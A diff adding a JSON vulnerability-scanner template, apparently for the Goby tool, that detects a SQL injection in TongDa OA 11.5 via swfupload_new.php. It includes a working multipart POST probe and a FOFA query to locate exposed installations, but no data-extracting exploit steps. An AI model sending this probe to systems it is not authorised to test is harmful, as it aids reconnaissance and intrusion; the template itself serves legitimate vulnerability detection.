@@ -1,0 +1,75 @@
+{
+  "Name": "通达OA 11.5版本存在swfupload_new文件SQL注入",
+  "Description": "通达OA该系统采用领先的B/S(浏览器/服务器)操作方式，使得网络办公不受地域限。Office Anywhere采用基于WEB的企业计算，主HTTP服务器采用了Apache服务器，性能稳定可靠。数据存取集中控制，避免了数据泄漏的可能。提供数据备份工具，保护系统数据安全。该系统存在由于SORT_ID，FILE_SORT函数导致的SQL注入，攻击者可以执行任意SQL命令。",
+  "Product": "TongDa-OA",
+  "Homepage": "http://www.tongda2000.com/",
+  "DisclosureDate": "2020-08-24",
+  "Author": "gobysec@gmail.com",
+  "FofaQuery": "app=\"TongDa-OA\"",
+  "Level": "2",
+  "Impact": "通达OA该系统采用领先的B/S(浏览器/服务器)操作方式，使得网络办公不受地域限。Office Anywhere采用基于WEB的企业计算，主HTTP服务器采用了Apache服务器，性能稳定可靠。数据存取集中控制，避免了数据泄漏的可能。提供数据备份工具，保护系统数据安全。该系统存在由于SORT_ID，FILE_SORT函数导致的SQL注入，攻击者可以执行任意SQL命令。",
+  "Recommendation": "",
+  "References": [
+    "http://fofa.so"
+  ],
+  "HasExp": false,
+  "ExpParams": null,
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/general/file_folder/swfupload_new.php",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=----------GFioQpMK0vv2"
+                        },
+                        "data_type": "text",
+                        "data": "------------GFioQpMK0vv2\nContent-Disposition: form-data; name=\"ATTACHMENT_ID\"\n\n1\n------------GFioQpMK0vv2\nContent-Disposition: form-data; name=\"ATTACHMENT_NAME\"\n\n1\n------------GFioQpMK0vv2\nContent-Disposition: form-data; name=\"FILE_SORT\"\n\n2\n------------GFioQpMK0vv2\nContent-Disposition: form-data; name=\"SORT_ID\"\n\n------------GFioQpMK0vv2--"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "insert into",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "SORT_ID",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["sqli"],
+  "CVEIDs": null,
+  "CVSSScore": "",
+  "AttackSurfaces": {
+    "Application": ["TongDa-OA"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
